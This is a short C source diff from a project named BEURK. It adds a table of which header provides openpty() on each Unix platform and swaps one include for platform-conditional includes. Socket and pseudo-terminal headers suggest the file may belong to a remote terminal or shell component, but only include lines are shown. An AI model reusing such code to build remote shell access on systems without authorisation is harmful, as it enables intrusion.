@@ -18,10 +18,29 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+/** Compatibility note
+ * Platform              Header              Library
+ * 
+ * Cygwin                <pty.h>             libc
+ * Interix               <pty.h>             libc
+ * OSF/1 4 and 5         <pty.h>             libc
+ * glibc                 <pty.h>             libutil
+ * MacOS X               <util.h>            libc
+ * OpenBSD, NetBSD       <util.h>            libutil
+ * FreeBSD               <libutil.h>         libutil
+ */
 #include <unistd.h> /* read(), close(), ... */
 #include <string.h> /* memset(), strncmp() */
 #include <stdint.h> /* size_t */
-#include <pty.h> /* openpty() */
+#if (defined(__APPLE__) && defined(__MACH__)) || defined(__OpenBSD__) || defined(__NetBSD__)
+# include <util.h> /* openpty() */
+#elif defined(__FreeBSD__)
+# include <libutil.h> /* openpty() */
+# include <netinet/in.h> /* struct sockaddr */
+#else
+# include <pty.h> /* openpty() */
+#endif
+#include <sys/ioctl.h> /* ioctl */
 #include <errno.h> /* errno globale */
 #include <arpa/inet.h> /* htons() */
 #include <sys/socket.h> /* struct sockaddr */
